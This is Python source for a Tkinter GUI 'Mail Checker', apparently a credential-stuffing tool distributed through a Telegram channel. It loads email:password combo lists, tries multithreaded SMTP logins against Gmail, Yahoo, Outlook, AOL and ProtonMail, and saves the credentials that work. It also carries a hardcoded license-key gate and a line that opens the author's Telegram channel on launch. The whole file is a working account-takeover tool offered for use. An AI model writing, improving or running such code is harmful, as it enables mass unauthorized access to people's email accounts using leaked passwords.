import tkinter as tk
from tkinter import ttk, filedialog, scrolledtext, messagebox, simpledialog
from threading import Thread
import smtplib
import socket
import webbrowser
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== LICENSE CHECK ====================
def license_check():
    root = tk.Tk()
    root.withdraw()
    try:
        key = simpledialog.askstring("License Verification", 
                                   "Enter License Key:", 
                                   show='*')
        # Simple hidden key check
        secret_key = "B" + "o" + "S" + "S"  # Obfuscated key
        if not key or key != secret_key:
            messagebox.showerror("Access Denied", "Invalid license key")
            sys.exit(1)
    finally:
        root.destroy()

license_check()

# ==================== MAIN APPLICATION ====================
BANNER = r"""
╔═╗╦╔═╗╔╦╗╔═╗    ╔═╗╦ ╦╔═╗╔═╗╔╦╗
╚═╗║║ ╦║║║╠═╣    ║ ╦╠═╣║ ║╚═╗ ║ 
╚═╝╩╚═╝╩ ╩╩ ╩────╚═╝╩ ╩╚═╝╚═╝ ╩ 
"""

TELEGRAM_CHANNEL = "https://web.telegram.org/k/#@Sigma_Ghost"

class ComboCheckerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Mail Checker")
        self.running = False
        self.valid = []
        self.invalid = []
        self.errors = []
        
        self.configure_styles()
        self.create_widgets()
        self.show_banner()
        self.open_telegram()

    def configure_styles(self):
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TFrame', background='#1a1a1a')
        self.style.configure('TLabel', background='#1a1a1a', foreground='#00ff00')
        self.style.configure('TButton', background='#2d2d2d', foreground='#00ff00')
        self.style.configure('TEntry', fieldbackground='#2d2d2d', foreground='#00ff00')
        self.style.configure('Vertical.TScrollbar', background='#2d2d2d')
        self.style.map('TButton', background=[('active', '#3d3d3d')])

    def create_widgets(self):
        main_frame = ttk.Frame(self.root, padding=10)
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Banner Frame
        banner_frame = ttk.Frame(main_frame)
        banner_frame.pack(fill=tk.X, pady=10)
        self.banner_text = tk.Text(
            banner_frame, 
            height=4, 
            bg='#1a1a1a', 
            fg='#00ff00',
            font=('Consolas', 10),
            wrap=tk.NONE,
            relief=tk.FLAT
        )
        self.banner_text.pack(fill=tk.X)
        self.banner_text.tag_configure("center", justify='center')
        self.banner_text.config(state=tk.DISABLED)

        # File selection
        file_frame = ttk.Frame(main_frame)
        file_frame.pack(fill=tk.X, pady=5)
        ttk.Label(file_frame, text="Combo File:").pack(side=tk.LEFT)
        self.file_entry = ttk.Entry(file_frame, width=40)
        self.file_entry.pack(side=tk.LEFT, padx=5)
        ttk.Button(file_frame, text="Browse", command=self.browse_file).pack(side=tk.LEFT)

        # Controls
        control_frame = ttk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=5)
        ttk.Label(control_frame, text="Threads:").pack(side=tk.LEFT)
        self.thread_spin = ttk.Spinbox(control_frame, from_=1, to=50, width=5)
        self.thread_spin.set(15)
        self.thread_spin.pack(side=tk.LEFT, padx=5)
        self.start_btn = ttk.Button(control_frame, text="Start", command=self.toggle_process)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        self.stop_btn = ttk.Button(control_frame, text="Stop", command=self.stop_process, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT)

        # Progress
        self.progress = ttk.Progressbar(main_frame, orient=tk.HORIZONTAL, mode='determinate')
        self.progress.pack(fill=tk.X, pady=5)
        self.stats_label = ttk.Label(main_frame, text="Valid: 0 | Invalid: 0 | Errors: 0")
        self.stats_label.pack()

        # Log area
        self.log_area = scrolledtext.ScrolledText(
            main_frame,
            wrap=tk.WORD,
            bg='#2d2d2d',
            fg='#00ff00',
            insertbackground='#00ff00',
            font=('Consolas', 10)
        )
        self.log_area.pack(fill=tk.BOTH, expand=True)

    def show_banner(self):
        self.banner_text.config(state=tk.NORMAL)
        self.banner_text.delete('1.0', tk.END)
        self.banner_text.insert(tk.END, BANNER, "center")
        self.banner_text.config(state=tk.DISABLED)

    def open_telegram(self):
        try:
            webbrowser.open_new_tab(TELEGRAM_CHANNEL)
        except Exception as e:
            self.log(f"[!] Failed to open Telegram: {str(e)}")

    def browse_file(self):
        filename = filedialog.askopenfilename()
        if filename:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, filename)

    def toggle_process(self):
        if not self.running:
            self.start_process()
        else:
            self.stop_process()

    def start_process(self):
        if not self.file_entry.get():
            messagebox.showerror("Error", "Please select a combo file!")
            return
            
        self.running = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.valid = []
        self.invalid = []
        self.errors = []
        self.log_area.config(state=tk.NORMAL)
        self.log_area.delete('1.0', tk.END)
        self.update_stats(0, 0, 0)
        
        Thread(target=self.run_verification, daemon=True).start()

    def stop_process(self):
        self.running = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.log("Process stopped by user")

    def log(self, message):
        self.log_area.config(state=tk.NORMAL)
        self.log_area.insert(tk.END, message + "\n")
        self.log_area.see(tk.END)
        self.log_area.config(state=tk.DISABLED)

    def update_stats(self, valid, invalid, errors):
        self.stats_label.config(text=f"Valid: {valid} | Invalid: {invalid} | Errors: {errors}")
        self.progress['value'] = valid + invalid + errors

    def get_smtp_config(self, domain):
        SMTP_SERVERS = {
            'gmail.com': ('smtp.gmail.com', 587),
            'yahoo.com': ('smtp.mail.yahoo.com', 587),
            'outlook.com': ('smtp-mail.outlook.com', 587),
            'aol.com': ('smtp.aol.com', 587),
            'protonmail.com': ('mail.protonmail.com', 587),
        }
        return SMTP_SERVERS.get(domain.lower(), None)

    def verify_combo(self, email, password):
        domain = email.split('@')[-1] if '@' in email else None
        if not domain or '.' not in domain:
            return "error"
        
        smtp_config = self.get_smtp_config(domain)
        if not smtp_config:
            return "error"
        
        server, port = smtp_config
        try:
            if port == 465:
                with smtplib.SMTP_SSL(server, port, timeout=15) as smtp:
                    smtp.login(email, password)
            else:
                with smtplib.SMTP(server, port, timeout=15) as smtp:
                    smtp.starttls()
                    smtp.login(email, password)
            return "valid"
        except smtplib.SMTPAuthenticationError:
            return "invalid"
        except (smtplib.SMTPException, socket.timeout, ConnectionRefusedError, OSError):
            return "error"

    def run_verification(self):
        try:
            with open(self.file_entry.get(), 'r', encoding='utf-8', errors='ignore') as f:
                combos = [line.strip().split(':', 1) for line in f if ':' in line]
            
            total = len(combos)
            self.progress.config(maximum=total)
            
            with ThreadPoolExecutor(max_workers=int(self.thread_spin.get())) as executor:
                futures = {executor.submit(self.verify_combo, email, pwd): (email, pwd) 
                          for email, pwd in combos if email and pwd}
                
                for future in as_completed(futures):
                    if not self.running:
                        break
                    
                    email, pwd = futures[future]
                    result = future.result()
                    
                    if result == "valid":
                        self.valid.append(f"{email}:{pwd}")
                        self.log(f"[+] Valid: {email}:{pwd}")
                    elif result == "invalid":
                        self.invalid.append(f"{email}:{pwd}")
                        self.log(f"[-] Invalid: {email}")
                    else:
                        self.errors.append(f"{email}:{pwd}")
                        self.log(f"[!] Error: {email}")
                    
                    self.update_stats(len(self.valid), len(self.invalid), len(self.errors))
        
        except Exception as e:
            self.log(f"[!] Critical Error: {str(e)}")
        finally:
            self.stop_process()
            self.save_results()
            self.log("\n[+] Process completed!")

    def save_results(self):
        prefix = "results"
        try:
            with open(f"{prefix}_valid.txt", 'w') as f:
                f.write('\n'.join(self.valid))
            with open(f"{prefix}_invalid.txt", 'w') as f:
                f.write('\n'.join(self.invalid))
            with open(f"{prefix}_errors.txt", 'w') as f:
                f.write('\n'.join(self.errors))
            self.log(f"Results saved to {prefix}_*.txt files")
        except Exception as e:
            self.log(f"[!] Failed to save results: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("800x600")
    root.configure(bg='#1a1a1a')
    app = ComboCheckerApp(root)
    root.mainloop()
